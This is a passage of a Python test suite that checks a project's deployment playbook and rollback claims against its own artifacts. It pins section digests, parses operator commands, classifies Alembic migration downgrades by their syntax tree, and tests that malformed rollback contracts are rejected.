    indent = len(line) - len(line.lstrip(" "))
    candidate = line.lstrip(" ") if indent <= 3 else ""
    if not candidate.startswith("#"):
        return 0
    depth = len(candidate) - len(candidate.lstrip("#"))
    if 0 < depth <= 6 and candidate[depth:depth + 1] in (" ", ""):
        return depth
    return 0


def _section_bytes(ref, root=None) -> str:
    """The EXACT text of the referenced section, HEADING INCLUDED (Wave 1 / F7; heading brought
    inside the digest by the gate fold, finding 8 — a heading renamed to a semantic reversal
    used to keep the reviewed pin, because only the body was hashed).

    The heading is matched by full-line equality against exactly one line — a substring match
    accepted any same-named section. The section runs from the heading line to the start of the
    next CommonMark ATX heading of the same or higher level (up to three leading spaces
    included, per finding 8), byte-exact; CRLF→LF is the ONLY normalization. The old digest
    collapsed all whitespace first, so a shell continuation rewritten from backslash-newline to
    backslash-space — which hands the shell a literal backslash argument and breaks the command —
    hashed identically and passed review.
    """
    text = ((root or REPO) / ref.path).read_bytes().decode("utf-8").replace("\r\n", "\n")
    lines = text.split("\n")
    matches = [i for i, line in enumerate(lines) if line == ref.heading]
    assert len(matches) == 1, (
        f"heading {ref.heading!r} matches {len(matches)} lines; the reference must name exactly "
        "one section by its exact heading line"
    )
    level = len(ref.heading) - len(ref.heading.lstrip("#"))
    start = matches[0] + 1
    end = len(lines)
    for i in range(start, len(lines)):
        depth = _atx_level(lines[i])
        if 0 < depth <= level:
            end = i
            break
    return "\n".join([ref.heading, *lines[start:end]])


def _section_body(section_text: str) -> str:
    """The section WITHOUT its heading line — what command parsing and prose quoting run over."""
    return section_text.partition("\n")[2]


def _section_commands(section_text: str) -> list[str]:
    """Every MARKED operator command in the section, in source order, as exact line strings
    (re-audit `1826661..b5c7a83` finding 4).

    The marking convention is the document's, not the parser's guess: operator commands live in
    ```operator fences (one command per line; a trailing backslash joins the next line with one
    space) and in ``double-backtick`` inline spans. Single-backtick spans are non-commands by
    construction — mentions, module names, flags — so nothing needs an exemption and nothing can
    consume 'every identical occurrence'. Bytes are compared exactly: no whitespace collapse, so
    an NBSP or raw-newline lookalike is not the reviewed command. Any root is inventoried —
    `rm`, `psql`, `aws` in a marked span must be typed or the section fails."""
    commands: list[str] = []
    lines = section_text.split("\n")
    i = 0
    while i < len(lines):
        stripped = lines[i].strip()
        if stripped.startswith("```"):
            info = stripped[3:].strip()
            block: list[str] = []
            i += 1
            while i < len(lines) and not lines[i].strip().startswith("```"):
                block.append(lines[i])
                i += 1
            if info == "operator":
                joined: list[str] = []
                for raw in block:
                    if joined and joined[-1].endswith("\\"):
                        joined[-1] = joined[-1][:-1].rstrip() + " " + raw.strip()
                    elif raw.strip():
                        joined.append(raw.strip())
                commands.append(("\x00FENCE", tuple(joined)))  # placeholder, flattened below
            i += 1
            continue
        for span in re.findall(r"(?<!`)``([^`]+?)``(?!`)", lines[i]):
            commands.append(("\x00SPAN", (span,)))
        i += 1
    flat: list[str] = []
    for _kind, entries in commands:
        flat.extend(entries)
    return flat


def _section_fence_infos(section_text: str) -> list[str]:
    """The info string of every fence in the section, in order — the closed vocabulary check."""
    infos, in_fence = [], False
    for line in section_text.split("\n"):
        if line.strip().startswith("```"):
            if not in_fence:
                infos.append(line.strip()[3:].strip())
            in_fence = not in_fence
    return infos


def _playbook_prose(ref) -> str:
    """The section body as a reader sees it: markdown emphasis stripped, lowercased.

    The DIGEST is taken over the raw normalized body (emphasis intact), because that is the byte
    sequence a reviewer read. Evidence quotes are matched against this softer form so a contract
    can quote a sentence without reproducing its asterisks and backticks.
    """
    return re.sub(r"[*`]", "", " ".join(_section_body(_section_bytes(ref)).split())).lower()


def _unique_quote_problems(prose: str, quote: str) -> list[str]:
    """Evidence must have ONE location (gate audit `6c4f54a..91fbde3` finding 6): 'the' is
    somewhere in every section, which is exactly why it proved nothing. Zero occurrences is the
    old failure; two or more is a quote that does not LOCATE its sentence."""
    count = prose.count(quote.lower())
    if count == 1:
        return []
    return [f"quote {quote!r} occurs {count} times in the span; evidence must occur exactly once"]


def _branch_marker_problems(prose: str, branches) -> list[str]:
    """Each branch's derived marker must appear EXACTLY ONCE, and in BRANCH_OUTCOMES order
    (finding 7): a duplicated or reordered marker makes one span swallow another, which is the
    cross-branch evidence defect at the playbook layer."""
    problems = []
    positions = []
    for outcome in playbook.BRANCH_OUTCOMES:
        marker = playbook.OUTCOME_MARKERS[outcome].lower()
        count = prose.count(marker)
        if count != 1:
            problems.append(f"marker {marker!r} occurs {count} times; want exactly 1")
        elif positions and prose.find(marker) < positions[-1]:
            problems.append(f"marker {marker!r} appears before its predecessor")
        if count == 1:
            positions.append(prose.find(marker))
    claimed = [b.outcome for b in branches]
    if claimed != [o for o in playbook.BRANCH_OUTCOMES if o in claimed]:
        problems.append(f"branches out of outcome order: {claimed}")
    return problems


def _downgrade_kind(path: Path) -> str:
    """How one revision's downgrade behaves, read from its AST.

    The distinction that matters is structural and unambiguous: a revision that refuses
    UNCONDITIONALLY opens its body with a bare `raise`, so nothing can run first. A revision that
    refuses on evidence reaches its `raise` through an `if`, and reverses cleanly when the
    condition does not hold. `test_rollback_claim...` needs the same split, and getting it from the
    tree rather than from a phrase is what makes the schema answer derived instead of asserted.
    """
    tree = ast.parse(path.read_text())
    fn = next((n for n in ast.walk(tree)
               if isinstance(n, ast.FunctionDef) and n.name == "downgrade"), None)
    if fn is None:
        return "absent"
    body = [n for n in fn.body
            if not (isinstance(n, ast.Expr) and isinstance(n.value, ast.Constant)
                    and isinstance(n.value.value, str))]
    if body and isinstance(body[0], ast.Raise):
        return "refuses_always"
    if any(isinstance(n, ast.Raise) for n in ast.walk(fn)):
        return "refuses_conditionally"
    if body and all(isinstance(n, ast.Pass) for n in body):
        return "no_op"
    return "reverses"


def _revision_file(revision: str) -> Path:
    matches = sorted((REPO / "alembic" / "versions").glob(f"{revision}_*.py"))
    assert len(matches) == 1, f"revision {revision} matches {len(matches)} files"
    return matches[0]


def _forward_only_revisions_named_in(body: str) -> set[str]:
    """Revisions the playbook body mentions whose downgrade refuses UNCONDITIONALLY.

    This is what binds `migration_range` to something outside the author's control. Without it the
    range is just another authored field, and understating it makes an understated schema answer
    self-consistent: declare `migration_range=()` alongside `schema=stays` and the derivation
    agrees, because it derives over the range it was handed. A playbook that names a forward-only
    revision is describing a cutover that crosses it, so the two cannot disagree. Defeating this
    means deleting `018` from DEPLOYMENT.md, which breaks the digest and the evidence quote.

    Only UNCONDITIONAL refusers count. Bodies legitimately reference older revisions for context —
    PR 6's names 003, 005, 010, 011 and 012, none of which are forward-only — and a cutover does
    not install every revision it mentions.
    """
    versions = REPO / "alembic" / "versions"
    forward_only = set()
    for revision in set(re.findall(r"\b(0\d{2})\b", body)):
        # A three-digit token is not necessarily a revision — 024 is named throughout and is
        # unbuilt. Only numbers with a revision file behind them are classified.
        if not sorted(versions.glob(f"{revision}_*.py")):
            continue
        if _downgrade_kind(_revision_file(revision)) == "refuses_always":
            forward_only.add(revision)
    return forward_only


def _assert_range_covers_forward_only(procedure, body: str, section: str) -> None:
    """The one check binding `migration_range` to something the author does not control.

    Factored out so the RED test below runs THIS code against a tampered procedure rather than a
    hand-copied restatement of it — a second copy of a guard is a guard that can pass while the
    real one fails.
    """
    uncovered = sorted(_forward_only_revisions_named_in(body) - set(procedure.migration_range))
    assert not uncovered, (
        f"{procedure.name}: {section!r} warns about forward-only revision(s) {uncovered} that "
        f"migration_range {procedure.migration_range or '(none)'} does not contain. A cutover "
        "cannot warn about a revision it claims not to install — that combination understates the "
        "boundary AND makes the schema answer derive over the understated range."
    )


def _schema_answer_from_migrations(revisions: tuple[str, ...]) -> str:
    """The schema answer a procedure MUST publish, computed from what its migrations actually do.

    Nothing about this reads the contract. It is the independent authority the contract's `schema`
    answer is compared against — the registry does not get to tell the test what the migrations do.
    """
    if not revisions:
        return playbook.SCHEMA_STAYS
    kinds = {revision: _downgrade_kind(_revision_file(revision)) for revision in revisions}
    values = set(kinds.values())
    if values <= {"reverses", "no_op"}:
        return playbook.SCHEMA_DOWNGRADES
    if values <= {"refuses_always"}:
        # Nothing in the range can be walked back at all.
        return playbook.SCHEMA_FROZEN
    # Some revision refuses and some does not, so how far the schema got decides whether it moves.
    # That covers both PR 7b-core's shape (018-022 refuse outright, 013-017 refuse only on
    # evidence, 023 is a no-op) and a range that refuses only conditionally — which is NOT a clean
    # downgrade: whether it reverses depends on whether a witness exists.
    return playbook.SCHEMA_CONDITIONAL


def _command_inventory_problems(ref, section: str) -> list[str]:
    """The marked operator inventory must equal the typed records EXACTLY — order, multiplicity,
    exact line bytes (finding 4). And the fence vocabulary is closed: every fence in a reviewed
    section is `operator` or `example`, so a command-shaped block cannot sit ambiguously between
    instruction and illustration."""
    problems = []
    for info in _section_fence_infos(_section_body(section)):
        if info not in ("operator", "example"):
            problems.append(
                f"fence info {info!r} is outside the closed vocabulary (operator|example)"
            )
    parsed = _section_commands(_section_body(section))
    typed = [c.line for c in ref.commands]
    if parsed != typed:
        problems.append(
            f"marked operator inventory != typed records.\n  marked: {parsed}\n"
            f"  typed:  {typed}"
        )
    return problems


# The reviewed complete-definition pins (re-audit finding 3): sha256 over each procedure's
# canonical structured projection — name, phase, subject id AND text, ref path/heading, typed
# command lines, span endpoints, every prerequisite's every field value, every aggregate and
# branch answer with its evidence. Editing ANY of it is a re-pin, the act of review.
PROCEDURE_DEFINITION_PINS = {
    "PR 5b full maintenance window": "4f872afc1bf22f3c",
    "Bundle-pinning activation": "728f296c280d0b37",
    "Migrations 013-023": "8e715cb619906abc",
}


@verifies("OPS.CUTOVER.PROCEDURES")
def _every_procedure_points_at_a_reviewed_playbook_body():
    """These claims deliberately do NOT restate steps, which makes the pointer load-bearing.

    Asserting the HEADING exists was not enough (re-audit `4f23f23..97deeae` finding 8): pointing
    the repo at a DEPLOYMENT.md containing only the three headings passed. So each procedure pins
    a digest of the REVIEWED BODY under its heading. An empty body, a wrong section with the same
    name, or an edit nobody re-reviewed all fail here, and re-pinning the digest is the act of
    re-reviewing.

    The digest alone was still not enough, which is the gap Claude declared open in
    `4c3015a..eaa3f8f`: `rollback` and `irreversible` were hand-written prose sitting BESIDE the
    digest, so rewriting them to prescribe the exact thing a playbook prohibits left the digest
    matching. Both are now derived from a typed `RollbackContract`, and this test holds every part
    of that contract against something outside it — the migrations for the schema answer, the
    digest-bound body for each quote, the contract's own structure for the rest.
    """
    procedures = OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
    assert {p.name for p in procedures} == {
        "PR 5b full maintenance window", "Bundle-pinning activation", "Migrations 013-023",
    }
    for procedure in procedures:
        ref = procedure.playbook_ref
        assert (REPO / ref.path).exists(), f"{procedure.name} points at a missing document"
        assert procedure.playbook == ref.display, "the printed pointer drifted from the ref"
        section = _section_bytes(ref)
        body = _section_body(section)
        assert len(body) > 500, (
            f"{procedure.name}: the section under {ref.heading!r} is {len(body)} chars — a "
            "pointer to an empty body is worse than the summary it replaced"
        )
        # The digest covers HEADING + body (gate finding 8): renaming the heading to a semantic
        # reversal used to keep the reviewed pin, because only the body was hashed.
        digest = hashlib.sha256(section.encode()).hexdigest()
        assert digest == ref.sha256, (
            f"{procedure.name}: {ref.heading!r} changed since it was reviewed.\n"
            f"  reviewed: {ref.sha256}\n  now:      {digest}\n"
            "Re-read the section EXACTLY — every byte is a reviewed byte, heading included — "
            "then re-pin sha256 in the SAME commit."
        )
        # The section's own commands, parsed independently, must reproduce the typed records
        # EXACTLY — order, multiplicity, argv — less only the named exemptions (Wave 1 / F7,
        # exactness by gate finding 8): a subset check let an appended command survive a digest
        # re-pin, and a command edit is still caught even when the record moves too.
        inventory_problems = _command_inventory_problems(ref, section)
        assert not inventory_problems, f"{procedure.name}: {inventory_problems}"
        # gate finding 5: the derived fields are REBOUND to the plan's own derivations every
        # run, so object.__setattr__ on the frozen procedure cannot outlive one verification
        assert procedure.when == procedure.plan.when(), (
            f"{procedure.name}: `when` no longer equals the plan's derivation"
        )
        assert procedure.blocks_start == procedure.plan.blocks_start(), (
            f"{procedure.name}: `blocks_start` no longer equals the plan's derivation"
        )
        # gate finding 6: the closed per-procedure profile owns the exact rollback answers and
        # the exact platform-commitment set — a divergent answer is a located failure
        from docs.contracts import plan as plan_module

        profile = plan_module.PROCEDURE_PROFILES[procedure.plan.subject_id]
        published_answers = tuple(
            (f.question, f.answer) for f in procedure.rollback_contract.facts)
        assert published_answers == profile.rollback_answers, (
            f"{procedure.name}: rollback answers diverge from the closed profile.\n"
            f"  published: {published_answers}\n  profile:   {profile.rollback_answers}"
        )
        committed = tuple(
            c for p in procedure.plan.prerequisites
            if isinstance(p, plan_module.PlatformWrittenCommitment) for c in p.commitments)
        assert committed == profile.commitments, (
            f"{procedure.name}: commitments {committed} != profile {profile.commitments}"
        )
        assert procedure.blocks_start, f"{procedure.name} lists nothing that blocks starting"
        assert procedure.when.strip()
        # re-audit finding 3: the COMPLETE definition, one pinned projection
        from docs.contracts.operations import procedure_projection

        projection_digest = hashlib.sha256(
            repr(procedure_projection(procedure)).encode()).hexdigest()[:16]
        assert projection_digest == PROCEDURE_DEFINITION_PINS[procedure.name], (
            f"{procedure.name}: the complete definition changed since review "
            f"(now {projection_digest}). Read the whole definition, then re-pin in the SAME "
            "commit."
        )
        # no step numbering: a numbered list here IS the summary this claim exists to avoid
        for prerequisite in procedure.blocks_start:
            assert not re.match(r"^\s*(?:step\s*)?\d+[.)]", prerequisite.lower()), (
                f"{procedure.name} is restating numbered steps again"
            )

        contract = procedure.rollback_contract
        # 1. TOTAL: the contract answers every question, so no control can be omitted by silence.
        answered = {f.question for f in contract.facts}
        assert answered == set(playbook.ROLLBACK_QUESTIONS), (
            f"{procedure.name} leaves {sorted(set(playbook.ROLLBACK_QUESTIONS) - answered)} "
            "unanswered"
        )
        # 2. DERIVED: the published prose is the contract's, not an author's.
        statements = contract.statements()
        assert procedure.irreversible == statements[0]
        assert procedure.rollback == statements[1:]
        # 3. QUOTED, UNIQUELY: every non-silent answer points at ONE sentence in the digest-bound
        #    body (uniqueness by gate finding 6 — 'the' is somewhere in every section, which is
        #    exactly why a bare substring check proved nothing).
        prose = _playbook_prose(ref)
        for fact in contract.facts:
            if fact.answer in playbook.SILENT_ANSWERS:
                assert not fact.evidence
                continue
            quote_problems = _unique_quote_problems(prose, fact.evidence)
            assert not quote_problems, (
                f"{procedure.name}/{fact.question}: {quote_problems} in the reviewed body of "
                f"{ref.heading!r}. An answer must come from ONE place in the playbook it claims "
                "to summarize."
            )
        for prerequisite in procedure.plan.prerequisites:
            quote_problems = _unique_quote_problems(prose, prerequisite.evidence)
            assert not quote_problems, (
                f"{procedure.name}/{type(prerequisite).__name__}: {quote_problems}"
            )
        # 4. BRANCH answers bind to their own span of the playbook (Wave 1 / F9): outcome-B
        #    evidence cannot justify outcome-A's image policy, because each branch's quotes must
        #    sit between ITS marker and the next. Reachable outcomes must be claimed exactly once
        #    each — an omitted branch is an unpublished side of a published fork.
        contract_branches = procedure.rollback_contract.branches
        if contract_branches:
            prose = _playbook_prose(ref)
            # gate finding 7: the derived markers must each appear exactly once, in outcome
            # order — a duplicated or swapped marker makes one span swallow another
            marker_problems = _branch_marker_problems(prose, contract_branches)
            assert not marker_problems, f"{procedure.name}: {marker_problems}"
            spans = {}
            markers = [b.span_marker for b in contract_branches]
            for branch in contract_branches:
                start = prose.find(branch.span_marker.lower())
                assert start >= 0, f"{procedure.name}: marker {branch.span_marker!r} not in body"
                ends = [prose.find(m.lower(), start + 1) for m in markers if m != branch.span_marker]
                ends = [e for e in ends if e > start]
                spans[branch.outcome] = prose[start:min(ends) if ends else len(prose)]
            for branch in contract_branches:
                for fact in branch.facts:
                    if fact.evidence:
                        quote_problems = _unique_quote_problems(
                            spans[branch.outcome], fact.evidence)
                        assert not quote_problems, (
                            f"{procedure.name}/{branch.outcome}/{fact.question}: "
                            f"{quote_problems} — evidence must sit at ONE place inside this "
                            "branch's own span; cross-branch evidence is the F9 defect itself"
                        )
            kinds = {r: _downgrade_kind(_revision_file(r)) for r in procedure.migration_range}
            reachable = set()
            if any(k in ("refuses_always", "refuses_conditionally") for k in kinds.values()):
                reachable.add(playbook.OUTCOME_REFUSED)
            if not all(k == "refuses_always" for k in kinds.values()):
                reachable.add(playbook.OUTCOME_SUCCEEDED)
            claimed = {b.outcome for b in contract_branches}
            assert claimed == reachable, (
                f"{procedure.name}: branches claim {sorted(claimed)} but the migrations make "
                f"{sorted(reachable)} reachable — an uncovered outcome has no published answer"
            )

        # 5. The RANGE is bound to the playbook, so it cannot be understated to make an
        #    understated schema answer agree with itself.
        _assert_range_covers_forward_only(procedure, body, ref.heading)
        # 5. The RANGE itself is recomputed through the verifier's own script-directory helper
        #    (separately hardened against the configured-tree substitution) and must match the
        #    procedure's derived range EXACTLY and IN ORDER — so even object.__setattr__ tampering
        #    on a constructed procedure cannot survive, and the visible name must be the resolved
        #    span's own display (Wave 1 / F8).
        if procedure.migration_span is not None:
            span = procedure.migration_span
            walk = list(_alembic_script().walk_revisions(
                base=span.base_revision, head=span.target_revision))
            recomputed = tuple(r.revision for r in reversed(walk)
                               if r.revision != span.base_revision)
            assert procedure.migration_range == recomputed, (
                f"{procedure.name}: derived range {procedure.migration_range} != the graph walk "
                f"{recomputed}"
            )
            assert procedure.name == f"Migrations {recomputed[0]}-{recomputed[-1]}"
        else:
            assert procedure.migration_range == (), (
                f"{procedure.name} carries a range with no span to derive it from"
            )

        # 6. INDEPENDENT: the schema answer is recomputed from the downgrade bodies.
        derived = _schema_answer_from_migrations(procedure.migration_range)
        assert contract.answer(playbook.SCHEMA) == derived, (
            f"{procedure.name} publishes schema={contract.answer(playbook.SCHEMA)!r} but its "
            f"migrations {procedure.migration_range or '(none)'} say {derived!r}"
        )

    by_name = {p.name: p for p in procedures}

    # PR 5b is SCOPED, not generic. A future unrelated full-window release must not inherit a
    # procedure whose rollback knowingly restores THIS release's vulnerability.
    pr5b = by_name["PR 5b full maintenance window"]
    assert "PR 5b" in pr5b.when and "do not reuse this one" in pr5b.when.lower()

    # And the release DID close a hole, which is executable, not editorial: the reviewer-actor
    # floor is in the shipped code and gates the manual-approve path. So an image-PRIOR rollback
    # reopens it, and the contract's own invariant then forces non-mutating verification. If the
    # floor is ever removed from the code, this fails and the answers must be re-derived.
    ingest = (SRC / "events" / "ingest.py").read_text()
    assert "reviewer_actor_reason" in ingest, "the PR 5b actor floor is gone from the ingest path"
    assert (SRC / "events" / "review_guard.py").exists()
    assert pr5b.rollback_contract.answer(playbook.IMAGE) == playbook.IMAGE_PRIOR
    assert pr5b.rollback_contract.answer(playbook.RESTORES) == playbook.RESTORES_YES
    assert pr5b.rollback_contract.answer(playbook.VERIFICATION) == playbook.VERIFY_NON_MUTATING

    # order inside the prerequisites still matters
    pr7b = [p.lower() for p in by_name["Migrations 013-023"].blocks_start]
    suspended = next(i for i, p in enumerate(pr7b) if "retention is suspended" in p)
    diagnostic = next(i for i, p in enumerate(pr7b) if "pre-window diagnostic" in p)
    assert suspended < diagnostic
    assert any("backup" in p for p in pr7b)

    # 013-023 is LOCAL authority; platform ordering waits for 024 (finding 5)
    when = by_name["Migrations 013-023"].when.lower()
    assert "receipt/transition-authority" in when
    assert "best-effort local supersession" in when
    assert "024" in when and "absent until" in when
    assert "ordering-authority schema" not in when

    # the control a step summary kept dropping
    assert any("load balancer" in p.lower() or "trusted path" in p.lower()
               for p in pr5b.blocks_start)
    # and the one TOTALITY recovered: every procedure must now publish that it ends resumed
    for procedure in procedures:
        assert procedure.rollback_contract.answer(playbook.ENDING) == playbook.ENDING_RESUMED


@verifies("OPS.CUTOVER.OUTBOX_CEILING")
def _outbox_ceiling_cutover_matches_the_shipped_canonical_record():
    """Rendered from the same record DEPLOYMENT, RUNBOOK, and .env.example embed, in order. This
    is the one cutover the registry does restate, because it is GENERATED from the authority
    rather than summarized from prose."""
    documented = OPERATIONS.value("OPS.CUTOVER.OUTBOX_CEILING")
    canonical = cutover.render_cutover(cutover.OUTBOX_MAX_ATTEMPTS_CUTOVER)[1:]  # drop the title
    assert list(documented) == [line.split(". ", 1)[1] for line in canonical]


@verifies("OPS.ROLLBACK.MIGRATION_BOUNDARY")
def _rollback_claim_matches_each_revision_s_actual_downgrade():
    """Derived from the migrations, not from a phrase.

    The claim said "018 and above refuse unconditionally". 018-022 do; 023's downgrade is a bare
    `pass` — it is validation-only, so stepping down from head removes its stamp and 022 blocks
    the next step. Overall safety is unchanged, but an operator planning a rollback was given a
    false per-revision account (re-audit `4f23f23..97deeae` finding 12). So the test reads each
    revision's downgrade body and requires the claim to match what is actually there.
    """
    versions = REPO / "alembic" / "versions"
    refusing, no_op = set(), set()
    for path in sorted(versions.glob("0*.py")):
        revision = path.name.split("_", 1)[0]
        tree = ast.parse(path.read_text())
        downgrade = next(
            (n for n in ast.walk(tree)
             if isinstance(n, ast.FunctionDef) and n.name == "downgrade"), None)
        if downgrade is None:
            continue
        body = [n for n in downgrade.body if not isinstance(n, ast.Expr)]  # drop the docstring
        if any(isinstance(n, ast.Raise) for n in ast.walk(downgrade)):
            refusing.add(revision)
        elif all(isinstance(n, ast.Pass) for n in body) and body:
            no_op.add(revision)

    assert {"018", "019", "020", "021", "022"} <= refusing, sorted(refusing)
    assert "023" in no_op, "023 no longer downgrades as a no-op; the claim's exception is stale"

    text = " ".join(OPERATIONS.value("OPS.ROLLBACK.MIGRATION_BOUNDARY"))
    assert "018 through 022" in text, "the claim is back to an 'and above' account"
    assert "unconditionally" in text.lower() and "including staging" in text.lower()
    assert "023" in text and "validation-only" in text and "022 then blocks" in text
    lowered = text.lower()
    assert "downgrade-freely" not in lowered.replace(
        "there is no downgrade-freely rule anywhere", "")


@verifies("OPS.HMAC.ROLLOUT_ORDER")
def _hmac_rollout_puts_the_v2_smoke_before_the_observation_clock():
    steps = [s.lower() for s in OPERATIONS.value("OPS.HMAC.ROLLOUT_ORDER")]
    smoke = next(i for i, s in enumerate(steps) if "v2-only callback" in s)
    clock = next(i for i, s in enumerate(steps) if "observation clock" in s)
    assert smoke < clock, "activating the observation clock before the v2 callback smoke"
    assert any("sign-off" in s for s in steps)


@verifies("OPS.RECOVERY.REQUEUE")
def _requeue_endpoints_exist_and_take_the_admin_token():
    """Route shape is compared with path parameters normalized: the document names them for a
    reader ({id}) and the code names them for a handler ({job_id}). The literal segments and the
    arity are the contract; the parameter's spelling is not."""

    def shape(path: str) -> str:
        return re.sub(r"\{[^}]*\}", "{}", path.rstrip(".,"))

    declared = {(method, shape(path)) for method, path in _declared_routes()}
    claim = OPERATIONS.value("OPS.RECOVERY.REQUEUE")
    documented = re.findall(r"/v1/ops/requeue/\S+", claim)
    assert len(documented) == 2
    for path in documented:
        assert ("POST", shape(path)) in declared, f"{path} is not a declared route"

    # always-mounted, and behind the admin token — both are the claim, and both are structural
    ops = (SRC / "api" / "routes_ops.py").read_text()
    assert "require_admin" in ops and "_require_ops_admin(request)" in ops
    app = (SRC / "api" / "app.py").read_text()
    assert "app.include_router(ops_router)" in app
    mounted_conditionally = re.search(r"if .*:\n\s+app\.include_router\(ops_router\)", app)
    assert mounted_conditionally is None, "the ops router is now mounted conditionally"

    # the fixed retry grant is a required keyword, not a default someone can forget to pass
    import inspect

    from kyc_tool.ops.requeue_service import requeue_dead_job

    grant = inspect.signature(requeue_dead_job).parameters["attempt_grant"]
    assert grant.kind is inspect.Parameter.KEYWORD_ONLY
    assert grant.default is inspect.Parameter.empty, "the retry grant now has a silent default"


# ── the closure and the runner ────────────────────────────────────────────────────────────────────
ALL_CLAIM_IDS = frozenset(WIRE.ids) | frozenset(OPERATIONS.ids)


def test_the_verifier_map_is_closed_over_both_registries():
    """The point of the whole file. A claim without a verifier is a value the documents publish
    that nothing checks; a verifier without a claim is a check that silently stopped running."""
    unverified = ALL_CLAIM_IDS - set(AUTHORITY_VERIFIERS)
    orphaned = set(AUTHORITY_VERIFIERS) - ALL_CLAIM_IDS
    assert not unverified, f"claims with no independent authority check: {sorted(unverified)}"
    assert not orphaned, f"verifiers naming claims that no longer exist: {sorted(orphaned)}"


@pytest.mark.parametrize("claim_id", sorted(ALL_CLAIM_IDS))
def test_claim_holds_against_independent_authority(claim_id):
    AUTHORITY_VERIFIERS[claim_id]()


def test_every_claim_names_an_authority_and_a_known_state():
    for registry in (WIRE, OPERATIONS):
        for claim in registry.claims:
            assert claim.authority.strip(), f"{claim.id} names no authority"
            assert isinstance(claim.state, ClaimState)
            assert claim.id == claim.id.upper(), f"{claim.id} should be an upper-case id"


# ── the rollback contract's guards, proven to bite ─────────────────────────────────────────────
#
# Everything below exists because the previous version of this control was assertion-shaped: it
# stated invariants and never showed one failing. A guard nobody has watched reject something is
# indistinguishable from a guard that cannot.


def _valid_facts(**overrides) -> tuple:
    """A well-formed contract, with named answers swapped out. The base is deliberately the
    mildest legal shape, so any rejection below is caused by the override under test."""
    base = {
        playbook.REVERSIBILITY: (playbook.REVERSIBLE_WITH_CONDITIONS, "a"),
        playbook.SCHEMA: (playbook.SCHEMA_STAYS, "b"),
        playbook.IMAGE: (playbook.IMAGE_PRIOR, "c"),
        playbook.RESTORES: (playbook.RESTORES_NO, "d"),
        playbook.VERIFICATION: (playbook.VERIFY_UNRESTRICTED, "e"),
        playbook.WINDOW: (playbook.WINDOW_LIGHTER, "f"),
        playbook.ENDING: (playbook.ENDING_RESUMED, "g"),
    }
    base.update(overrides)
    return tuple(
        playbook.RollbackFact(q, answer, evidence) for q, (answer, evidence) in base.items()
    )


def test_the_baseline_contract_is_actually_valid():
    """Otherwise every rejection below could be the baseline failing, not the mutation."""
    assert playbook.RollbackContract(_valid_facts()).statements()


ROLLBACK_MUTATIONS = [
    (
        "restoring a vulnerability without restricting verification",
        {playbook.RESTORES: (playbook.RESTORES_YES, "d"),
         playbook.VERIFICATION: (playbook.VERIFY_UNRESTRICTED, "e")},
        "non-mutating",
    ),
    (
        "restoring a vulnerability while claiming the playbook is silent on probes",
        {playbook.RESTORES: (playbook.RESTORES_YES, "d"),
         playbook.VERIFICATION: (playbook.VERIFY_NOT_STATED, "")},
        "non-mutating",
    ),
    (
        "staying on this release's image while claiming it reopens the hole",
        {playbook.IMAGE: (playbook.IMAGE_SAME_RELEASE, "c"),
         playbook.RESTORES: (playbook.RESTORES_YES, "d"),
         playbook.VERIFICATION: (playbook.VERIFY_NON_MUTATING, "e")},
        "cannot restore what this release closed",
    ),
    (
        "a branch-dependent image on a schema that cannot move",
        {playbook.IMAGE: (playbook.IMAGE_CONDITIONAL, "c")},
        "no second branch",
    ),
    (
        "a boundary in the schema answer but not in the reversibility answer",
        {playbook.SCHEMA: (playbook.SCHEMA_CONDITIONAL, "b")},
        "same boundary seen twice",
    ),
    (
        "an irreversible cutover whose schema answer forgot the boundary",
        {playbook.REVERSIBILITY: (playbook.IRREVERSIBLE_PAST_BOUNDARY, "a")},
        "same boundary seen twice",
    ),
    (
        "calling a rollback plain when it reopens a closed hole",
        {playbook.REVERSIBILITY: (playbook.REVERSIBLE_PLAINLY, "a"),
         playbook.RESTORES: (playbook.RESTORES_YES, "d"),
         playbook.VERIFICATION: (playbook.VERIFY_NON_MUTATING, "e")},
        "not plainly reversible",
    ),
    (
        "calling a rollback plain when it needs the full window",
        {playbook.REVERSIBILITY: (playbook.REVERSIBLE_PLAINLY, "a"),
         playbook.WINDOW: (playbook.WINDOW_SAME, "f")},
        "not plainly reversible",
    ),
    (
        "citing one clause as the evidence for two different answers",
        {playbook.WINDOW: (playbook.WINDOW_LIGHTER, "g")},
        "more than one question",
    ),
]


@pytest.mark.parametrize(
    "label,overrides,needle", ROLLBACK_MUTATIONS, ids=[m[0] for m in ROLLBACK_MUTATIONS]
)
def test_rollback_contract_rejects(label, overrides, needle):
    with pytest.raises(ValueError, match=re.escape(needle)):
        playbook.RollbackContract(_valid_facts(**overrides))


def test_an_incomplete_contract_cannot_be_built():
    """Totality is the guard that recovered the end-resumed control. A procedure that simply omits
    a rollback question must not be constructible."""
    partial = tuple(f for f in _valid_facts() if f.question != playbook.ENDING)
    with pytest.raises(ValueError, match="does not answer"):
        playbook.RollbackContract(partial)


def test_an_answer_must_quote_the_playbook_and_silence_must_not():
    with pytest.raises(ValueError, match="must quote the playbook"):
        playbook.RollbackFact(playbook.WINDOW, playbook.WINDOW_SAME, "")
    with pytest.raises(ValueError, match="cannot also quote"):
        playbook.RollbackFact(playbook.VERIFICATION, playbook.VERIFY_NOT_STATED, "something")
    with pytest.raises(ValueError, match="is not one of"):
        playbook.RollbackFact(playbook.WINDOW, "whenever_convenient", "x")
    with pytest.raises(ValueError, match="unknown rollback question"):
        playbook.RollbackFact("vibes", playbook.WINDOW_SAME, "x")


def test_rollback_prose_cannot_be_authored_at_all():
    """The original attack was editing the rollback text. There is no longer a field to edit: both
    published fields are `init=False` and computed from the contract."""
    contract = playbook.RollbackContract(_valid_facts())
    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    common = dict(
        name="x", plan=pr6.plan, playbook_ref=pr6.playbook_ref,
        rollback_contract=contract,
    )
    with pytest.raises(TypeError):
        Procedure(**common, rollback=("redeploy the previous image",))
    with pytest.raises(TypeError):
        Procedure(**common, irreversible="No, just redeploy.")
    # F4a: the plan prose is equally unauthorable — a sentence that keeps every keyword while
    # reversing its meaning has no field to live in.
    with pytest.raises(TypeError):
        Procedure(**common, when="Flip the flag while the workers roll; keywords intact.")
    with pytest.raises(TypeError):
        Procedure(**common, blocks_start=("The flag may be ON if convenient.",))
    # and what it does publish is exactly the contract's own sentences
    built = Procedure(**common)
    assert built.irreversible == contract.statements()[0]
    assert built.rollback == contract.statements()[1:]


def test_an_answer_quoting_a_sentence_the_playbook_does_not_contain_is_caught():
